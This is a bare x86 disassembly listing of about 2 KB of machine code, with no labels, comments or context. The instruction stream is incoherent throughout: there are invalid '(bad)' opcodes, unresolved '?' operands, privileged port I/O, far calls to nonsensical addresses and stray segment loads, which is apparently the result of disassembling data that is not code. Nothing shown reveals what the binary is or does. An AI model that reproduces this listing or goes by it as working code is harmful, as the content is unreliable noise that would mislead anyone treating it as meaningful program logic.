  41953e:	pop    eax
  41953f:	or     BYTE PTR [eax+0x7f],bl
  419542:	mov    al,ds:0xa4e6c7aa
  419547:	in     eax,0xda
  419549:	fs push ds
  41954b:	inc    edx
  41954c:	mov    edx,0x40cc31bf
  419551:	ret    0x565f
  419554:	pusha  
  419555:	mov    ah,0x5a
  419557:	dec    esp
  419558:	popf   
  419559:	or     eax,0xc9b65214
  41955e:	scas   eax,DWORD PTR es:[edi]
  41955f:	mov    ds:0xa9995fb0,al
  419564:	or     eax,0x966b6587
  419569:	lock push edx
  41956b:	push   ebp
  41956c:	fcom   DWORD PTR [ecx-0x2d]
  41956f:	cmp    al,0x46
  419571:	mov    eax,ds:0xeecf6e25
  419576:	mov    edx,0xe9510593
  41957b:	inc    edx
  41957c:	add    eax,0x244ddd15
  419581:	push   esi
  419582:	das    
  419583:	xchg   ebx,eax
  419584:	or     DWORD PTR [edx],esp
  419586:	mov    DWORD PTR [ebp+esi*4-0x6ad349d0],esi
  41958d:	xchg   ecx,eax
  41958e:	es das 
  419590:	add    esp,DWORD PTR cs:[eax+0x1a679934]
  419597:	sbb    esi,DWORD PTR [esi+0x5c]
  41959a:	inc    edi
  41959b:	aas    
  41959c:	jmp    ebp
  41959e:	adc    eax,0x8f62014e
  4195a3:	xor    DWORD PTR [ecx+edi*2+0x7ed771b3],edi
  4195aa:	push   eax
  4195ab:	inc    ebx
  4195ac:	mov    dh,0x87
  4195ae:	pop    ecx
  4195af:	outs   dx,BYTE PTR ds:[esi]
  4195b0:	ret    
  4195b1:	mov    cl,0xa6
  4195b3:	ds mov ebp,0xeaf9ec8
  4195b9:	and    eax,0xf94c509a
  4195be:	cmp    BYTE PTR [edi-0x63abc25a],ch
  4195c4:	pop    ebx
  4195c5:	xor    ebx,DWORD PTR [ebx+0x6055efe5]
  4195cb:	sbb    cl,BYTE PTR ds:0x93a10060
  4195d1:	scas   al,BYTE PTR es:[edi]
  4195d2:	ret    
  4195d3:	pop    ebp
  4195d4:	clc    
  4195d5:	les    esp,FWORD PTR [edi+0x298913cd]
  4195db:	jmp    0x69647ef4
  4195e0:	mov    BYTE PTR [edi-0x2956c771],0x8f
  4195e7:	outs   dx,BYTE PTR ds:[esi]
  4195e8:	cmp    eax,0x5f9e6fef
  4195ed:	add    bl,BYTE PTR [eax-0x25]
  4195f0:	jb     0x41962f
  4195f2:	lods   eax,DWORD PTR ds:[esi]
  4195f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195f4:	js     0x4195ca
  4195f6:	clc    
  4195f7:	and    BYTE PTR [edi],dh
  4195f9:	aas    
  4195fa:	aas    
  4195fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195fc:	out    0xe9,al
  4195fe:	rcl    BYTE PTR [eax],cl
  419600:	jo     0x4195c2
  419602:	lds    edx,FWORD PTR [esi]
  419604:	loope  0x4195b2
  419606:	dec    esi
  419607:	mov    edi,0xf2ebe8b2
  41960c:	stos   BYTE PTR es:[edi],al
  41960d:	sub    eax,DWORD PTR [esi-0x26]
  419610:	add    BYTE PTR [ebx],bh
  419612:	clc    
  419613:	pop    ss
  419614:	sahf   
  419615:	das    
  419616:	adc    al,0xff
  419618:	aaa    
  419619:	mov    edx,0xa71d2c3d
  41961e:	js     0x4195d1
  419620:	adc    dl,dh
  419622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419623:	into   
  419624:	add    ebp,ecx
  419626:	jmp    0x481d:0x9a7e3565
  41962d:	sub    eax,0x8b4992f6
  419632:	fisub  WORD PTR [ecx-0x19ee69e0]
  419638:	in     eax,dx
  419639:	ror    BYTE PTR [esi-0x140b9448],1
  41963f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419640:	out    dx,eax
  419641:	or     al,0x14
  419643:	loop   0x4195e8
  419645:	push   ebp
  419646:	sbb    BYTE PTR ss:[ebx],al
  419649:	(bad)
  41964c:	xchg   esi,eax
  41964d:	sub    eax,0x559039a0
  419652:	pop    esp
  419653:	push   ds
  419654:	sti    
  419655:	addr16 cld 
  419657:	retf   0x326
  41965a:	int3   
  41965b:	push   cs
  41965c:	or     esp,DWORD PTR [ebx+ebp*4-0xa]
  419660:	push   ebx
  419661:	mov    DWORD PTR [eax],edx
  419663:	add    ecx,DWORD PTR [ecx]
  419665:	mov    ebp,0x4da6ae09
  41966a:	push   eax
  41966b:	stos   BYTE PTR es:[edi],al
  41966c:	stos   BYTE PTR es:[edi],al
  41966d:	inc    ebx
  41966e:	sbb    eax,0xd62b7f74
  419673:	xchg   edi,eax
  419674:	dec    ebx
  419675:	in     al,0xd7
  419677:	mov    ebx,0x85dbc5c5
  41967c:	call   0xdab0:0x6c30fb6b
  419683:	xor    al,0x14
  419685:	add    DWORD PTR [ecx],eax
  419687:	jg     0x4196d9
  419689:	lea    ecx,[ecx-0x76]
  41968c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41968d:	rcr    DWORD PTR [edi-0x7ea410e0],1
  419693:	xchg   ecx,eax
  419694:	pop    ebx
  419695:	cmp    eax,0xa830b92b
  41969a:	xor    eax,0xd76fe68b
  41969f:	xchg   edx,eax
  4196a0:	imul   eax,DWORD PTR [edx-0x13],0xffffffc3
  4196a4:	scas   al,BYTE PTR es:[edi]
  4196a5:	cmp    DWORD PTR [edx],esi
  4196a7:	cwde   
  4196a8:	jle    0x4196af
  4196aa:	aaa    
  4196ab:	int    0x55
  4196ad:	cmc    
  4196ae:	push   edx
  4196af:	cmp    DWORD PTR [edi+0x17],edx
  4196b2:	je     0x41970b
  4196b4:	and    bh,BYTE PTR [ebx+0x6fc2217]
  4196ba:	pop    edi
  4196bb:	add    dl,BYTE PTR [ebx+0x7]
  4196be:	loope  0x419674
  4196c0:	sbb    eax,0x4906cca3
  4196c5:	cdq    
  4196c6:	and    eax,0xb861ed61
  4196cb:	retf   0x5fdb
  4196ce:	dec    ebx
  4196cf:	push   ss
  4196d0:	enter  0x9884,0xcf
  4196d4:	mov    al,0xb4
  4196d6:	cmp    BYTE PTR [edi],0x69
  4196d9:	cmp    edi,DWORD PTR [ebp-0x64be10b3]
  4196df:	xchg   esp,eax
  4196e0:	mov    dl,0xe3
  4196e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196e3:	popf   
  4196e4:	in     al,0x7a
  4196e6:	jae    0x4196de
  4196e8:	cmp    esi,DWORD PTR [ecx+0x6463e714]
  4196ee:	mov    ds:0x5fd24836,eax
  4196f3:	rcl    eax,0x6c
  4196f6:	aas    
  4196f7:	and    al,0xd9
  4196f9:	cwde   
  4196fa:	push   ds
  4196fb:	dec    edx
  4196fc:	xchg   ebp,eax
  4196fd:	aam    0x7a
  4196ff:	lds    edi,FWORD PTR [ecx-0x6b]
  419702:	cs icebp 
  419704:	dec    esi
  419705:	icebp  
  419706:	jecxz  0x419728
  419708:	mov    BYTE PTR [ebp-0x72419002],0xba
  41970f:	xor    DWORD PTR [eax],esp
  419711:	loopne 0x419729
  419713:	inc    edi
  419714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419715:	ret    0x7e7e
  419718:	mov    eax,DWORD PTR [ecx]
  41971a:	xchg   ebp,eax
  41971b:	pop    esi
  41971c:	adc    dl,BYTE PTR [ebx+ebx*4]
  41971f:	mov    dh,cl
  419721:	push   0x68
  419723:	xchg   edx,eax
  419724:	call   0xa1c6ba97
  419729:	cdq    
  41972a:	cld    
  41972b:	pop    esp
  41972c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41972d:	jbe    0x419752
  41972f:	sub    ch,BYTE PTR [edx-0x65850514]
  419735:	pop    edi
  419736:	retf   0x4446
  419739:	lods   al,BYTE PTR ds:[esi]
  41973a:	repz mov esi,0xd9bc670e
  419740:	cmp    DWORD PTR [eax-0x11],edx
  419743:	ja     0x4196ec
  419745:	scas   al,BYTE PTR es:[edi]
  419746:	int3   
  419747:	sub    eax,0xeecfb293
  41974c:	jge    0x41972b
  41974e:	sub    cl,BYTE PTR [esi]
  419750:	pop    eax
  419751:	das    
  419752:	pushf  
  419753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419754:	mov    ds:0x92c78418,al
  419759:	and    al,0x3d
  41975b:	retf   
  41975c:	inc    ebx
  41975d:	mov    edx,0xbd4f91f2
  419762:	fidiv  DWORD PTR [ebp-0x2e]
  419765:	push   0x37
  419767:	je     0x419780
  419769:	lock ror DWORD PTR ds:0x261847e9,0x80
  419771:	mov    ds:0x1a9e64cd,al
  419776:	shr    BYTE PTR [edx-0xbb21938],cl
  41977c:	adc    ch,BYTE PTR [edx+0x4a76c3e6]
  419782:	enter  0x8f2b,0xcf
  419786:	or     eax,0x13290ffa
  41978b:	xchg   edi,eax
  41978c:	(bad)
  419790:	pushf  
  419791:	bound  eax,QWORD PTR [esi-0xb15f2a5]
  419797:	sbb    dh,cl
  419799:	aaa    
  41979a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41979b:	mov    cl,0x37
  41979d:	mov    dh,0xee
  41979f:	call   0xf8ed:0x75008149
  4197a6:	fsubr  DWORD PTR [eax]
  4197a8:	int3   
  4197a9:	sub    eax,0xc49df0bb
  4197ae:	scas   eax,DWORD PTR es:[edi]
  4197af:	pop    ds
  4197b0:	icebp  
  4197b1:	adc    eax,0x8fda7e37
  4197b6:	push   0x22
  4197b8:	fs (bad) 
  4197bb:	mov    ss,WORD PTR [edi-0x5c]
  4197be:	shl    DWORD PTR [edi+0x3f],0xc7
  4197c2:	mov    DWORD PTR [edx-0xc116f52],edx
  4197c8:	fidiv  WORD PTR [ebx-0x6c]
  4197cb:	inc    eax
  4197cc:	sti    
  4197cd:	mov    bh,0x39
  4197cf:	fadd   DWORD PTR [edi+0x37f9d202]
  4197d5:	mov    ds:0xbd95c7d4,eax
  4197da:	js     0x4197c0
  4197dc:	jnp    0x419800
  4197de:	or     BYTE PTR [ebp-0x6f],0x31
  4197e2:	push   ecx
  4197e3:	push   edi
  4197e4:	mov    esi,0xb683a143
  4197e9:	xchg   ebp,eax
  4197ea:	(bad)  
  4197eb:	push   DWORD PTR [eax-0xb]
  4197ee:	out    0xdc,al
  4197f0:	sti    
  4197f1:	shr    BYTE PTR [ecx],1
  4197f3:	dec    edx
  4197f4:	fmul   QWORD PTR [ebx+ecx*1]
  4197f7:	test   DWORD PTR ds:0x14b890aa,eax
  4197fd:	(bad)  
  4197fe:	(bad)  
  4197ff:	mov    bl,0x3
  419801:	or     esp,DWORD PTR [ebx+0x2a588c93]
  419807:	mov    dl,BYTE PTR [esi+ebx*2+0x42c5eae3]
  41980e:	jmp    0x521efbe3
  419813:	imul   esp,eax,0xf00bca12
  419819:	call   0xe63ada20
  41981e:	out    dx,al
  41981f:	mov    al,0x16
  419821:	or     BYTE PTR [eax+0x3b0f48a6],0xc0
  419828:	jle    0x4197ff
  41982a:	mov    edi,0x26ce5b87
  41982f:	xor    BYTE PTR [edi-0x41339e14],bl
  419835:	lock push esp
  419837:	test   BYTE PTR [eax],dl
  419839:	je     0x419820
  41983b:	mov    edx,0xf78965c3
  419840:	jno    0x4197d7
  419842:	in     al,0xf
  419844:	mov    ch,0x69
  419846:	shr    BYTE PTR [ebx],cl
  419848:	daa    
  419849:	retf   
  41984a:	pop    ds
  41984b:	lods   eax,DWORD PTR ds:[esi]
  41984c:	icebp  
  41984d:	jae    0x419880
  41984f:	add    eax,0x9efd742f
  419854:	outs   dx,DWORD PTR ds:[esi]
  419855:	aam    0xdb
  419857:	inc    eax
  419858:	call   0xf4f0:0x2d382a89
  41985f:	cli    
  419860:	mov    ebp,0xcc30e8ea
  419865:	jp     0x419804
  419867:	(bad)  
  419869:	shl    DWORD PTR [ebx+0x2d353d7f],0x27
  419870:	xchg   esi,eax
  419871:	mov    esi,0xdab0f79d
  419876:	mov    esp,0x9efa877d
  41987b:	test   eax,0x9f53a397
  419880:	stos   BYTE PTR es:[edi],al
  419881:	xor    DWORD PTR es:[edi+0x2d],esi
  419885:	scas   al,BYTE PTR es:[edi]
  419886:	jecxz  0x419808
  419888:	add    al,dl
  41988a:	ds lahf 
  41988c:	add    bl,dl
  41988e:	aam    0xe1
  419890:	int3   
  419891:	mov    ds:0xdf267691,eax
  419896:	or     al,0xc7
  419898:	dec    ebx
  419899:	add    BYTE PTR [ebx+0x59],0xd6
  41989d:	cmp    eax,eax
  41989f:	int3   
  4198a0:	out    0xc7,eax
  4198a2:	pusha  
  4198a3:	and    al,0x56
  4198a5:	addr16 cmp esi,ecx
  4198a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198a9:	and    al,0x22
  4198ab:	scas   al,BYTE PTR es:[edi]
  4198ac:	(bad)  
  4198ad:	test   BYTE PTR [edi],0x73
  4198b0:	add    al,0xca
  4198b2:	pusha  
  4198b3:	mov    ?,WORD PTR [edi+0x83fea70]
  4198b9:	lods   eax,DWORD PTR ds:[esi]
  4198ba:	mov    dh,0xae
  4198bc:	inc    esp
  4198bd:	js     0x4198e2
  4198bf:	int    0xe6
  4198c1:	inc    edx
  4198c2:	mov    ch,0x29
  4198c4:	push   ecx
  4198c5:	dec    esi
  4198c6:	out    dx,eax
  4198c7:	ins    WORD PTR es:[edi],dx
  4198c9:	mov    eax,0xaae1d8c5
  4198ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198cf:	push   esi
  4198d0:	cwde   
  4198d1:	not    DWORD PTR [eax-0xdc049d3]
  4198d7:	cli    
  4198d8:	aas    
  4198d9:	inc    edx
  4198da:	mov    bh,0x47
  4198dc:	sbb    al,0x55
  4198de:	fld    TBYTE PTR [edi+0x5ba7af99]
  4198e4:	test   al,0x9b
  4198e6:	in     eax,dx
  4198e7:	mov    esp,DWORD PTR [edx-0x7e]
  4198ea:	mov    eax,ds:0x77116bee
  4198ef:	aam    0x56
  4198f1:	call   DWORD PTR [edx+0x30]
  4198f4:	stos   DWORD PTR es:[edi],eax
  4198f5:	adc    esi,DWORD PTR [esi]
  4198f7:	mov    edi,?
  4198f9:	or     BYTE PTR [ebp-0x18],dh
  4198fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198fd:	xchg   edx,eax
  4198fe:	add    al,0xf8
  419900:	jnp    0x419977
  419902:	(bad)  
  419903:	loope  0x419941
  419905:	sahf   
  419906:	addr16 push eax
  419908:	mov    dh,BYTE PTR [edi]
  41990a:	dec    esp
  41990b:	xchg   BYTE PTR ds:[ebp-0x3e51590],dh
  419912:	ficomp WORD PTR [edx-0x7e3b988d]
  419918:	pop    eax
  419919:	jecxz  0x4198fc
  41991b:	cmp    BYTE PTR [esi-0x5f],cl
  41991e:	lods   eax,DWORD PTR ds:[esi]
  41991f:	mov    DWORD PTR [ebp-0x60ddd40e],ebp
  419925:	pop    es
  419926:	test   eax,0x710bc4e1
  41992b:	sub    eax,0xcf054795
  419930:	dec    ebp
  419931:	push   ss
  419932:	and    eax,0x2609de62
  419937:	jecxz  0x4198c0
  419939:	in     eax,dx
  41993a:	das    
  41993b:	icebp  
  41993c:	mov    bh,bl
  41993e:	fwait
  41993f:	fs jns 0x419941
  419942:	imul   ebx,DWORD PTR [ebx],0xffffffc0
  419945:	je     0x419962
  419947:	and    esp,DWORD PTR [eax+0x1f]
  41994a:	jb     0x41995e
  41994c:	(bad)  
  41994d:	mov    edi,0x81a69b60
  419952:	jbe    0x419943
  419954:	fs xchg ebp,eax
  419956:	inc    esp
  419957:	jge    0x4198fe
  419959:	ds push 0x9b7d2630
  41995f:	js     0x4199d1
  419961:	mov    edi,0x29fa79a9
  419966:	push   ds
  419967:	sub    BYTE PTR [edx+0x18a8429f],0x88
  41996e:	js     0x419960
  419970:	shl    DWORD PTR [edi+0x4c],1
  419973:	xor    DWORD PTR [edx+ecx*8+0x2d],edi
  419977:	mov    al,ds:0xfddc3271
  41997c:	popf   
  41997d:	jns    0x419939
  41997f:	jns    0x419983
  419981:	leave  
  419982:	shr    BYTE PTR [ecx+edx*8+0x418185ef],0x38
  41998a:	mov    eax,0xe7f28f37
  41998f:	lods   eax,DWORD PTR ds:[esi]
  419990:	cmc    
  419991:	(bad)  
  419992:	ja     0x4199b2
  419994:	scas   al,BYTE PTR es:[edi]
  419995:	in     eax,0xb1
  419997:	mov    eax,ds:0xbd75843e
  41999c:	outs   dx,BYTE PTR ds:[esi]
  41999d:	pop    esp
  41999e:	aad    0xe2
  4199a0:	jle    0x419937
  4199a2:	xor    ah,BYTE PTR [edi]
  4199a4:	pop    edx
  4199a5:	pop    esp
  4199a6:	push   esp
  4199a7:	mov    ecx,0x238c6398
  4199ac:	(bad)  
  4199ad:	es xchg ebp,eax
  4199af:	retf   0x8c9b
  4199b2:	jmp    0xeb78:0x1b6fb0b
  4199b9:	les    ebp,FWORD PTR [eax-0x77]
  4199bc:	and    al,0xb5
  4199be:	and    eax,DWORD PTR [edx+0x7a0b56ad]
  4199c4:	das    
  4199c5:	mov    esp,0xc18d009f
  4199ca:	jmp    0x651f7f4
  4199cf:	inc    edx
  4199d0:	or     ah,BYTE PTR [eax]
  4199d2:	shr    DWORD PTR [ebp-0x187b68c4],0xb
  4199d9:	sub    bh,0x40
  4199dc:	iret   
  4199dd:	xor    cl,ch
  4199df:	xchg   DWORD PTR [edx],eax
  4199e1:	jae    0x419964
  4199e3:	dec    eax
  4199e4:	outs   dx,DWORD PTR ds:[esi]
  4199e5:	push   ebp
  4199e6:	xchg   ecx,eax
  4199e7:	adc    al,0x4a
  4199e9:	shl    DWORD PTR [esi+0x34c2aaa4],cl
  4199ef:	xchg   BYTE PTR [eax+0x1e28c2ac],ah
  4199f5:	jl     0x419a50
  4199f7:	pop    esi
  4199f8:	push   ecx
  4199f9:	(bad)  
  4199fa:	mov    al,0xb8
  4199fc:	jno    0x419a28
  4199fe:	pop    ss
  4199ff:	jg     0x419a30
  419a01:	cmp    DWORD PTR [esi+ebp*8+0x2bf2dc60],ecx
  419a08:	lfs    esi,FWORD PTR [ebx]
  419a0b:	adc    bh,BYTE PTR [ecx-0x4c0ddfb3]
  419a11:	std    
  419a12:	inc    esi
  419a13:	scas   al,BYTE PTR es:[edi]
  419a14:	outs   dx,DWORD PTR ds:[esi]
  419a15:	jg     0x419a0f
  419a17:	lds    edx,FWORD PTR [ebx+0x3e]
  419a1a:	mov    gs,WORD PTR [ebx+0xd]
  419a1d:	mov    esi,0x70866e01
  419a22:	leave  
  419a23:	push   0xf
  419a25:	pop    ss
  419a26:	or     esp,edx
  419a28:	xor    DWORD PTR [edi-0x65d3f6a6],esi
  419a2e:	adc    DWORD PTR [edx+0x6dca1731],edi
  419a34:	test   eax,0x4a57218d
  419a39:	dec    esi
  419a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a3b:	jbe    0x419aa7
  419a3d:	push   ecx
  419a3e:	push   cs
  419a3f:	aaa    
  419a40:	push   esi
  419a41:	mov    eax,ds:0x65ac82f8
  419a46:	scas   eax,DWORD PTR es:[edi]
  419a47:	ret    0xf0fe
  419a4a:	jb     0x419a23
  419a4c:	jne    0x4199eb
  419a4e:	xor    BYTE PTR [esi-0x7fb92327],ch
  419a54:	inc    eax
  419a55:	xor    BYTE PTR [ebx+0x392e29e2],0x2b
  419a5c:	mov    ecx,edi
  419a5e:	or     edx,esi
  419a60:	daa    
  419a61:	call   0xca43:0x85e8efa8
  419a68:	ret    
  419a69:	dec    ebx
  419a6a:	out    0x3e,eax
  419a6c:	lds    edi,FWORD PTR [ebx-0x575a5231]
  419a72:	mov    ds:0x81cd304e,al
  419a77:	nop
  419a78:	gs dec ecx
  419a7a:	out    dx,eax
  419a7b:	or     BYTE PTR [ecx-0x7e51b928],bh
  419a81:	xor    ebx,DWORD PTR [ebx]
  419a83:	bt     DWORD PTR [edx-0x15388e3c],eax
  419a8a:	les    edx,FWORD PTR ds:0xfe419565
  419a90:	sbb    BYTE PTR [edx],cl
  419a92:	loop   0x419a57
  419a94:	hlt    
  419a95:	test   DWORD PTR [ecx+0x19],esi
  419a98:	pushf  
  419a99:	mov    ecx,0x1de3279e
  419a9e:	sub    BYTE PTR [edx-0xcd09446],cl
  419aa4:	push   es
  419aa5:	adc    bl,BYTE PTR [eax]
  419aa7:	les    edi,FWORD PTR [edi-0x339826a3]
  419aad:	rol    DWORD PTR [ebp-0x16bbae54],0xbc
  419ab4:	pop    esp
  419ab5:	neg    DWORD PTR [eax]
  419ab7:	xchg   edx,eax
  419ab8:	push   0x5e
  419aba:	sub    eax,0x1ee548b
  419abf:	push   esp
  419ac0:	jbe    0x419aa1
  419ac2:	add    DWORD PTR [eax+eiz*4],esp
  419ac5:	or     DWORD PTR [ebp-0x3e69aa35],edx
  419acb:	out    0xc5,al
  419acd:	jecxz  0x419ace
  419acf:	add    al,0xd9
  419ad2:	std    
  419ad3:	xor    al,0xe6
  419ad5:	add    ah,BYTE PTR [esp+ebp*4]
  419ad8:	xor    BYTE PTR [edx+eiz*8-0x2f],cl
  419adc:	test   eax,0x61ca473e
  419ae1:	jno    0x419b3c
  419ae3:	jno    0x419b08
  419ae5:	push   esi
  419ae6:	out    0x72,al
  419ae8:	pop    edi
  419ae9:	inc    ebx
  419aea:	arpl   ax,si
  419aec:	push   ebx
  419aed:	mul    BYTE PTR [edx-0x44]
  419af0:	fild   DWORD PTR [ebx-0x66e869db]
  419af6:	add    esp,DWORD PTR [esi-0x34]
  419af9:	mov    esp,0xe441115d
  419afe:	dec    edi
  419aff:	sub    BYTE PTR ds:0x4f2f4b75,bl
  419b05:	imul   esp,DWORD PTR [eax-0x57],0xffffffb3
  419b09:	or     dl,BYTE PTR [eax+0x71]
  419b0c:	mov    WORD PTR [ebx-0xd3db7b2],gs
  419b12:	aas    
  419b13:	loopne 0x419ae0
  419b15:	mov    al,ds:0xa44813b9
  419b1a:	xchg   esi,eax
  419b1b:	xchg   esi,ebx
  419b1d:	(bad)  
  419b1e:	cmp    ah,cl
  419b20:	cmp    eax,0xd4123181
  419b25:	jp     0x419b28
  419b27:	sub    al,0xfc
  419b29:	retf   
  419b2a:	jp     0x419b91
  419b2c:	pop    ecx
  419b2d:	js     0x419b47
  419b2f:	xor    esp,ebp
  419b31:	inc    ebp
  419b32:	mov    ah,0x36
  419b34:	imul   ebp,edx,0x6ab2b210
  419b3a:	pop    es
  419b3b:	or     ah,BYTE PTR [eax]
  419b3d:	neg    DWORD PTR [esi-0x3d]
  419b40:	dec    ebx
  419b41:	jb     0x419bb4
  419b43:	rcl    BYTE PTR [edx+0x3669035a],0xfb
  419b4a:	daa    
  419b4b:	js     0x419b29
  419b4d:	adc    ch,BYTE PTR [ebx-0x1a]
  419b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b51:	(bad)  
  419b52:	in     eax,0x13
  419b54:	sbb    DWORD PTR [ebx+0x10],edx
  419b57:	imul   esp,DWORD PTR [ecx+0x75761502],0xeaff378d
  419b61:	test   al,0x9c
  419b63:	pop    ds
  419b64:	jb     0x419af0
  419b66:	sub    ebp,DWORD PTR [edx]
  419b68:	mov    ebx,0xab1606fc
  419b6d:	lods   al,BYTE PTR ds:[esi]
  419b6e:	jecxz  0x419bd7
  419b70:	and    DWORD PTR [ebx+eax*4-0x622b780e],edi
  419b77:	mov    ecx,0xb872750
  419b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b7d:	repnz popa 
  419b7f:	addr16 std 
  419b81:	nop    ecx
  419b84:	sub    ah,bh
  419b86:	(bad)  
  419b87:	ds gs push 0x14
  419b8b:	fdivrp st(5),st
  419b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b8e:	sti    
  419b8f:	mov    edi,0x4fff8b1e
  419b94:	xlat   BYTE PTR ds:[ebx]
  419b95:	or     esi,DWORD PTR [edi]
  419b97:	jle    0x419b84
  419b99:	jp     0x419c00
  419b9b:	clc    
  419b9c:	int3   
  419b9d:	out    0x6f,eax
  419b9f:	popf   
  419ba0:	das    
  419ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ba2:	test   DWORD PTR [esi+0x733545bb],edx
  419ba8:	ss push ebp
  419baa:	or     esi,DWORD PTR [esp+ecx*4]
  419bad:	std    
  419bae:	sbb    bh,BYTE PTR [ecx+0x4e]
  419bb1:	repz xchg ebp,eax
  419bb3:	outs   dx,BYTE PTR ds:[esi]
  419bb4:	cmp    BYTE PTR [edx+ecx*1],al
  419bb7:	and    BYTE PTR [ebx+0x10f665bd],0xd3
  419bbe:	in     eax,0xaa
  419bc0:	jge    0x419c03
  419bc2:	adc    ebx,DWORD PTR [eax+0x1d]
  419bc5:	test   al,0x8d
  419bc7:	repz cs inc esi
  419bca:	add    DWORD PTR [edi],ebp
  419bcc:	jno    0x419c4a
  419bce:	sbb    eax,esp
  419bd0:	cmp    eax,DWORD PTR [edi+0x74]
  419bd3:	xor    DWORD PTR [edx+0x25],eax
  419bd6:	mov    edi,0xb2ea884b
  419bdb:	pop    eax
  419bdc:	out    dx,eax
  419bdd:	xchg   DWORD PTR [ebp+ebp*1+0x32],ebx
  419be1:	test   al,0xca
  419be3:	pop    ebp
  419be4:	arpl   WORD PTR [ebp+0x6],si
  419be7:	ins    DWORD PTR es:[edi],dx
  419be8:	fisttp QWORD PTR [eax+ecx*1-0x5c]
  419bec:	call   0x4f4b:0x793862d2
  419bf3:	frstor [edx+0x295d6025]
  419bf9:	aas    
  419bfa:	pusha  
  419bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bfc:	cmp    bh,BYTE PTR [eax]
  419bfe:	xor    al,0xaa
  419c00:	das    
  419c01:	stos   BYTE PTR es:[edi],al
  419c02:	pop    ebx
  419c03:	adc    DWORD PTR [eax-0x3ecce007],0x8a9ac9c4
  419c0d:	inc    esp
  419c0e:	test   DWORD PTR [edi-0x57184f77],0x477a8c57
  419c18:	xor    DWORD PTR [ebx-0x755a1cf6],edi
  419c1e:	nop
  419c1f:	mov    eax,ds:0x757bd66f
  419c24:	stc    
  419c25:	imul   edi,DWORD PTR [esi],0xa2746267
  419c2b:	xor    ebx,DWORD PTR [ebx]
  419c2d:	xor    eax,0x33e39e8c
  419c32:	pop    edx
  419c33:	mov    al,0x56
  419c35:	sbb    dl,0x5b
  419c38:	std    
  419c39:	sbb    BYTE PTR [eax],ah
  419c3b:	jle    0x419c2b
  419c3d:	scas   al,BYTE PTR es:[edi]
  419c3e:	retf   
  419c3f:	loopne 0x419c3f
  419c41:	pop    edx
  419c42:	in     al,0x1b
  419c44:	cmp    al,0xc9
  419c46:	js     0x419bfe
  419c48:	cmp    eax,0x946ae33c
  419c4d:	push   ebp
  419c4e:	pop    es
  419c4f:	xlat   BYTE PTR ds:[ebx]
  419c50:	dec    ebx
  419c51:	shl    DWORD PTR [ecx+ebp*1-0x465a1d01],0x78
  419c59:	cdq    
  419c5a:	adc    al,0xbf
  419c5c:	in     eax,dx
  419c5d:	jo     0x419bfe
  419c5f:	std    
  419c60:	mov    BYTE PTR [ebx+0x29d2a2b5],cl
  419c66:	xchg   esp,eax
  419c67:	scas   eax,DWORD PTR es:[edi]
  419c68:	into   
  419c69:	shl    DWORD PTR [ecx],0x7f
  419c6c:	add    DWORD PTR [esi+edi*2],ebp
  419c6f:	outs   dx,DWORD PTR ds:[esi]
  419c70:	inc    ecx
  419c71:	ins    BYTE PTR es:[edi],dx
  419c72:	jg     0x419c7f
  419c74:	sub    eax,0x1d755e53
  419c79:	popa   
  419c7a:	pushf  
  419c7b:	aad    0xd6
  419c7d:	rcl    DWORD PTR [ebx],1
  419c7f:	sub    al,0x32
  419c81:	mov    ch,BYTE PTR [edi+0x55]
  419c84:	and    eax,DWORD PTR [ecx-0x19]
  419c87:	lds    eax,FWORD PTR [edi+0x6ec3e12b]
  419c8d:	add    BYTE PTR [esi],dl
  419c8f:	pop    edi
  419c90:	sbb    dh,ch
  419c92:	fild   WORD PTR ds:[eax]
  419c95:	imul   DWORD PTR [eax]
  419c97:	push   ebx
  419c98:	add    BYTE PTR [ebx],ah
  419c9a:	lahf   
  419c9b:	sahf   
  419c9c:	cmp    edx,DWORD PTR [ecx-0x16]
  419c9f:	lods   eax,DWORD PTR ds:[esi]
  419ca0:	and    BYTE PTR [esi+0x36],dh
  419ca3:	sbb    BYTE PTR [ebx],bl
  419ca5:	js     0x419cd4
  419ca7:	dec    eax
  419ca8:	fldcw  WORD PTR [ebx+eiz*4]
  419cab:	add    BYTE PTR [ecx-0x57f7a38],0x79
  419cb2:	out    dx,eax
  419cb3:	push   eax
  419cb4:	shl    ah,1
  419cb6:	add    DWORD PTR [edi-0x2],edx
  419cb9:	and    eax,edx
  419cbb:	mov    bl,0x47
  419cbd:	aad    0x4f
  419cbf:	mov    gs,WORD PTR [ecx-0x37]
  419cc2:	jp     0x419cdd
  419cc4:	sub    al,bh
  419cc6:	jae    0x419c66
  419cc8:	shl    BYTE PTR [edi+0x79],cl
  419ccb:	ins    BYTE PTR es:[edi],dx
  419ccc:	mov    ds:0x9bb9abd6,eax
  419cd1:	sti    
  419cd2:	and    al,0x4c
  419cd4:	into   
  419cd5:	cmp    eax,0x84b90ffd
  419cda:	ins    BYTE PTR es:[edi],dx
  419cdb:	call   0xbc3b:0x89503541
  419ce2:	fdiv   QWORD PTR [esi]
  419ce4:	std    
  419ce5:	sub    BYTE PTR [edx-0x2b],bl
  419ce8:	mov    al,0x34
  419cea:	mov    al,ds:0xd5163ed0
  419cef:	cvtps2pd xmm1,xmm5
  419cf2:	idiv   ecx
  419cf4:	or     eax,0x9c51772b
  419cf9:	add    bl,BYTE PTR [eax+0x1e]
  419cfc:	aam    0xb5
